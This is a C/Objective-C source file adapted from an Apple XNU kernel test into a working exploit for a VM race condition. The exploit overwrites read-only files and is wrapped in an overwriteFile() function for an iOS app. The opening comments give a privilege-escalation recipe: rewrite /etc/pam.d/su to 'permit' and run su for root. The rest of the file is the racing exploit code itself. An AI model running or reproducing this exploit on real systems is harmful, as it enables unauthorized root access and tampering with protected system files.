// from https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c
// modified to compile outside of XNU

// clang -o switcharoo vm_unaligned_copy_switch_race.c
// sed -e "s/rootok/permit/g" /etc/pam.d/su > overwrite_file.bin
// ./switcharoo /etc/pam.d/su overwrite_file.bin
// su
// modified by haxi0

@import Foundation;
#import <UIKit/UIKit.h>
#import "DockHider-Swift.h"
#include <pthread.h>
#include <dispatch/dispatch.h>
#include <stdio.h>

#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>

#include <fcntl.h>
#include <sys/mman.h>

#define T_QUIET
#define T_EXPECT_MACH_SUCCESS(a, b)
#define T_EXPECT_MACH_ERROR(a, b, c)
#define T_ASSERT_MACH_SUCCESS(a, b, ...)
#define T_ASSERT_MACH_ERROR(a, b, c)
#define T_ASSERT_POSIX_SUCCESS(a, b)
#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { fprintf(stderr, c "\n");} }while(0)
#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { fprintf(stderr, c "\n");} }while(0)
#define T_ASSERT_TRUE(a, b, ...)
#define T_LOG(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
#define T_DECL(a, b) static void a(void)
#define T_PASS(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)

static const char* g_arg_target_file_path;
static const char* g_arg_overwrite_file_path;

struct context1 {
    vm_size_t obj_size;
    vm_address_t e0;
    mach_port_t mem_entry_ro;
    mach_port_t mem_entry_rw;
    dispatch_semaphore_t running_sem;
    pthread_mutex_t mtx;
    bool done;
};

static void *
switcheroo_thread(__unused void *arg)
{
    kern_return_t kr;
    struct context1 *ctx;

    ctx = (struct context1 *)arg;
    /* tell main thread we're ready to run */
    dispatch_semaphore_signal(ctx->running_sem);
    while (!ctx->done) {
        /* wait for main thread to be done setting things up */
        pthread_mutex_lock(&ctx->mtx);
        /* switch e0 to RW mapping */
        kr = vm_map(mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            ctx->mem_entry_rw,
            0,
            FALSE,         /* copy */
            VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RW");
        /* wait a little bit */
        usleep(100);
        /* switch bakc to original RO mapping */
        kr = vm_map(mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            ctx->mem_entry_ro,
            0,
            FALSE,         /* copy */
            VM_PROT_READ,
            VM_PROT_READ,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RO");
        /* tell main thread we're don switching mappings */
        pthread_mutex_unlock(&ctx->mtx);
        usleep(100);
    }
    return NULL;
}

T_DECL(unaligned_copy_switch_race,
    "Test that unaligned copy respects read-only mapping")
{
    pthread_t th = NULL;
    int ret;
    kern_return_t kr;
    time_t start, duration;
    mach_msg_type_number_t cow_read_size;
    vm_size_t copied_size;
    int loops;
    vm_address_t e2, e5;
    struct context1 context1, *ctx;
    int kern_success = 0, kern_protection_failure = 0, kern_other = 0;
    vm_address_t ro_addr, tmp_addr;
    memory_object_size_t mo_size;

    ctx = &context1;
    ctx->obj_size = 256 * 1024;
    ctx->e0 = 0;
    ctx->running_sem = dispatch_semaphore_create(0);
    T_QUIET; T_ASSERT_NE(ctx->running_sem, NULL, "dispatch_semaphore_create");
    ret = pthread_mutex_init(&ctx->mtx, NULL);
    T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, "pthread_mutex_init");
    ctx->done = false;
    ctx->mem_entry_rw = MACH_PORT_NULL;
    ctx->mem_entry_ro = MACH_PORT_NULL;
#if 0
    /* allocate our attack target memory */
    kr = vm_allocate(mach_task_self(),
        &ro_addr,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate ro_addr");
    /* initialize to 'A' */
    memset((char *)ro_addr, 'A', ctx->obj_size);
#endif
    int fd = open(g_arg_target_file_path, O_RDONLY | O_CLOEXEC);
    ro_addr = (uintptr_t)mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, fd, 0);
    /* make it read-only */
    kr = vm_protect(mach_task_self(),
        ro_addr,
        ctx->obj_size,
        TRUE,             /* set_maximum */
        VM_PROT_READ);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_protect ro_addr");
    /* make sure we can't get read-write handle on that target memory */
    mo_size = ctx->obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
        &mo_size,
        ro_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
        &ctx->mem_entry_ro,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_ERROR(kr, KERN_PROTECTION_FAILURE, "make_mem_entry() RO");
    /* take read-only handle on that target memory */
    mo_size = ctx->obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
        &mo_size,
        ro_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ,
        &ctx->mem_entry_ro,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RO");
    T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, "wrong mem_entry size");
    /* make sure we can't map target memory as writable */
    tmp_addr = 0;
    kr = vm_map(mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        0,         /* mask */
        VM_FLAGS_ANYWHERE,
        ctx->mem_entry_ro,
        0,
        FALSE,         /* copy */
        VM_PROT_READ,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);
    T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");
    tmp_addr = 0;
    kr = vm_map(mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        0,         /* mask */
        VM_FLAGS_ANYWHERE,
        ctx->mem_entry_ro,
        0,
        FALSE,         /* copy */
        VM_PROT_READ | VM_PROT_WRITE,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);
    T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");

    /* allocate a source buffer for the unaligned copy */
    kr = vm_allocate(mach_task_self(),
        &e5,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e5");
    /* initialize to 'C' */
    memset((char *)e5, 'C', ctx->obj_size);

    FILE* overwrite_file = fopen(g_arg_overwrite_file_path, "r");
    fseek(overwrite_file, 0, SEEK_END);
    size_t overwrite_length = ftell(overwrite_file);
    if (overwrite_length >= PAGE_SIZE) {
        fprintf(stderr, "too long!\n");
        fprintf(stderr, "overwrite_length: %zu\n", overwrite_length);
        fprintf(stderr, "PAGE_SIZE: %d\n", PAGE_SIZE);
        // shrink it until it fits
        while (overwrite_length >= PAGE_SIZE) {
            overwrite_length -= 1;
        }
        fprintf(stderr, "shrunk to: %zu\n", overwrite_length);
        // set the file pointer back to the beginning
        fseek(overwrite_file, 0, SEEK_SET);
        // truncate the file
        ftruncate(fileno(overwrite_file), overwrite_length);
    }
    fseek(overwrite_file, 0, SEEK_SET);
    char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - overwrite_length);
    fread(e5_overwrite_ptr, 1, overwrite_length, overwrite_file);
    fclose(overwrite_file);

    int overwrite_first_diff_offset = -1;
    char overwrite_first_diff_value = 0;
    for (int off = 0; off < overwrite_length; off++) {
        if (((char*)ro_addr)[off] != e5_overwrite_ptr[off]) {
            overwrite_first_diff_offset = off;
            overwrite_first_diff_value = ((char*)ro_addr)[off];
        }
    }
    if (overwrite_first_diff_offset == -1) {
        fprintf(stderr, "no diff?\n");
        InProg *inProg = [[InProg alloc] init];
        [inProg disableProg];
        [inProg setDiff];
        return;
    }

    /*
     * get a handle on some writable memory that will be temporarily
     * switched with the read-only mapping of our target memory to try
     * and trick copy_unaligned to write to our read-only target.
     */
    tmp_addr = 0;
    kr = vm_allocate(mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate() some rw memory");
    /* initialize to 'D' */
    memset((char *)tmp_addr, 'D', ctx->obj_size);
    /* get a memory entry handle for that RW memory */
    mo_size = ctx->obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
        &mo_size,
        tmp_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
        &ctx->mem_entry_rw,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RW");
    T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, "wrong mem_entry size");
    kr = vm_deallocate(mach_task_self(), tmp_addr, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate() tmp_addr 0x%llx", (uint64_t)tmp_addr);
    tmp_addr = 0;

    pthread_mutex_lock(&ctx->mtx);

    /* start racing thread */
    ret = pthread_create(&th, NULL, switcheroo_thread, (void *)ctx);
    T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, "pthread_create");

    /* wait for racing thread to be ready to run */
    dispatch_semaphore_wait(ctx->running_sem, DISPATCH_TIME_FOREVER);

    duration = 10; /* 10 seconds */
    T_LOG("Testing for %ld seconds...", duration);
    for (start = time(NULL), loops = 0;
        time(NULL) < start + duration;
        loops++) {
        /* reserve space for our 2 contiguous allocations */
        e2 = 0;
        kr = vm_allocate(mach_task_self(),
            &e2,
            2 * ctx->obj_size,
            VM_FLAGS_ANYWHERE);
        T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate to reserve e2+e0");

        /* make 1st allocation in our reserved space */
        kr = vm_allocate(mach_task_self(),
            &e2,
            ctx->obj_size,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(240));
        T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e2");
        /* initialize to 'B' */
        memset((char *)e2, 'B', ctx->obj_size);

        /* map our read-only target memory right after */
        ctx->e0 = e2 + ctx->obj_size;
        kr = vm_map(mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(241),
            ctx->mem_entry_ro,
            0,
            FALSE,         /* copy */
            VM_PROT_READ,
            VM_PROT_READ,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() mem_entry_ro");

        /* let the racing thread go */
        pthread_mutex_unlock(&ctx->mtx);
        /* wait a little bit */
        usleep(100);

        /* trigger copy_unaligned while racing with other thread */
        kr = vm_read_overwrite(mach_task_self(),
            e5,
            ctx->obj_size,
            e2 + overwrite_length,
            &copied_size);
        T_QUIET;
        T_ASSERT_TRUE(kr == KERN_SUCCESS || kr == KERN_PROTECTION_FAILURE,
            "vm_read_overwrite kr %d", kr);
        switch (kr) {
        case KERN_SUCCESS:
            /* the target was RW */
            kern_success++;
            break;
        case KERN_PROTECTION_FAILURE:
            /* the target was RO */
            kern_protection_failure++;
            break;
        default:
            /* should not happen */
            kern_other++;
            break;
        }
        /* check that our read-only memory was not modified */
        T_QUIET; T_ASSERT_EQ(((char *)ro_addr)[overwrite_first_diff_offset], overwrite_first_diff_value, "RO mapping was modified");

        /* tell racing thread to stop toggling mappings */
        pthread_mutex_lock(&ctx->mtx);

        /* clean up before next loop */
        vm_deallocate(mach_task_self(), ctx->e0, ctx->obj_size);
        ctx->e0 = 0;
        vm_deallocate(mach_task_self(), e2, ctx->obj_size);
        e2 = 0;
    }

    ctx->done = true;
    pthread_join(th, NULL);

    kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_rw);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_rw)");
    kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_ro);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_ro)");
    kr = vm_deallocate(mach_task_self(), ro_addr, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(ro_addr)");
    kr = vm_deallocate(mach_task_self(), e5, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(e5)");


    T_LOG("vm_read_overwrite: KERN_SUCCESS:%d KERN_PROTECTION_FAILURE:%d other:%d",
        kern_success, kern_protection_failure, kern_other);
    T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
    InProg *inProg = [[InProg alloc] init];
    [inProg disableProg];
}

void overwriteFile(NSData *data, NSString *path) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        g_arg_target_file_path = [path UTF8String];
        // save the data to a temp file
        NSString *model_path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"pwned"];
        [data writeToFile:model_path atomically:YES];
        g_arg_overwrite_file_path = [model_path UTF8String];
        unaligned_copy_switch_race();
    });
}